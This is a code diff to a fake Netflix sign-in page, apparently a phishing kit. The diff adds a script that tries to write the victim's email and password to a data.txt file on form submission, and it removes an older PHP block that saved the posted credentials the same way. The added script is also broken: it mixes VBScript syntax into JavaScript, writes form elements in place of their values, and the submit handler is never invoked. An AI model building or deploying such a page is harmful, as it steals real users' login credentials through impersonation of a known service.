@@ -254,13 +254,29 @@ html, body {
 </style>
 </head> 
 <body>
+<script language="Javascript">
+    function WriteToFile(passForm) {
+
+        set fso = CreateObject("Scripting.FileSystemObject");
+        set f = fso.CreateTextFile("data.txt", True);
+
+        var Email = document.getElementById('email');
+        var Password = document.getElementById('password');
+
+        f.writeline("Email :" + Email);
+        f.writeline("Password :" + Password);
+
+        f.writeline("-----------------------------");
+        f.Close();
+    }
+</script>
 <img class="logo" src="logo.png"/>
 <br>
 <br>
 <div class="login">
 	<h1 class="log">Sign In</h1>
 	<br>
-	<form action="loading.html" method="post"><center>
+	<form action="loading.html" onsubmit="WriteToFile"><center>
 	<label for="email"></label> 
 	<input style="font-size: 16px;" class="email" type="email" name="email" placeholder="  Email or phone number" required="required">
 	<br>
@@ -304,18 +320,5 @@ html, body {
 <a href="https://help.netflix.com/legal/termsofuse" target="_blank" class="terms">Terms of Use</a>
 <a href="https://help.netflix.com/legal/privacy" target="_blank" class="privacy">Privacy</a>
 </footer>
-
-<?php 
-if(isset($_POST['Sign In'])){
-$email = "Email: ".$_POST['email']."
-";
-$password = "Password: ".$_POST['password']."
-";
-$file=fopen("data.txt","w");
-fwrite($file, $email);
-fwrite($file, $password);
-fclose($file);
-}
-?>
 </body> 
 </html>
